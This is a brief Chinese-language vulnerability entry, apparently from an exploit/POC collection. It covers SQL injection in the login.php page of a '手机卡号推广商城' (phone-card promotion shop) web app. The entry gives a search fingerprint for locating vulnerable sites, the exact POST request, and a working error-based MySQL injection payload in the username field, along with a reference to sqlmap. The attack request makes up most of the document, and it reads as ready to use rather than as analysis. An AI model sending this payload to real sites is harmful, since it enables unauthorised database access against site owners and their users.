# 手机卡号推广商城ssk存在SQL注入漏洞

- **系统**：手机卡号推广商城　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="zgdx.php"`
- **请求**：`POST /ssk/login.php HTTP/1.1`
- **关键头**：`Content-Length: 199`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
username=' OR (SELECT 5126 FROM(SELECT COUNT(*),CONCAT(0x716a6a6a71,(SELECT (ELT(5126=5126,1))),0x71786b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Tyft&password=123123
qjjjq1qxkzq1
sqlmap
POST /ssk/login.php HTTP/1.1
Host:
Content-Length: 199
Content-Type: application/x-www-form-urlencoded
username=&password=123123
```

**其他**
- 手机卡号推广商城ssk存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 手机卡号推广商城